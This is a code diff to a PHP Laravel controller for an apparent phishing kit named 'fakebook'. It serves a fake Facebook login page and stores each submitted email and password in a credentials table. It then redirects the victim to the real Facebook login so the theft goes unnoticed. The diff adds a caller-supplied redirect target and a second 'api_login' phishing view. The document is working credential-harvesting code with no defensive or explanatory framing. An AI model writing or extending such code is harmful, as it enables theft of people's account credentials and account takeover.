@@ -11,14 +11,26 @@ class IndexController extends Controller
 {
     public function showLogin()
     {
-    	return view('fakebook.login');
+        return view('fakebook.login');
     }
 
-    public function storeCredentials(Request $request,DatabaseManager $databaseManager)
+    public function storeCredentials(Request $request, DatabaseManager $databaseManager)
     {
-    	$email = $request->input('email');
-    	$pass = $request->input('pass');
-    	$databaseManager->table('credentials')->insert(['email'=> $email,'password'=>$pass]);
-    	return redirect('https://www.facebook.com/login.php?login_attempt=1&lwv=110');
+        $email    = $request->input('email');
+        $pass     = $request->input('pass');
+        $redirect = $request->input('redirect');
+
+        $databaseManager->table('credentials')->insert(['email' => $email, 'password' => $pass]);
+        if ($redirect) {
+            return redirect($redirect);
+        }
+        else{
+            return redirect('https://www.facebook.com/login.php?login_attempt=1&lwv=110');
+        }
+    }
+
+    public function showApiLogin()
+    {
+        return view('fakebook.api_login');
     }
 }
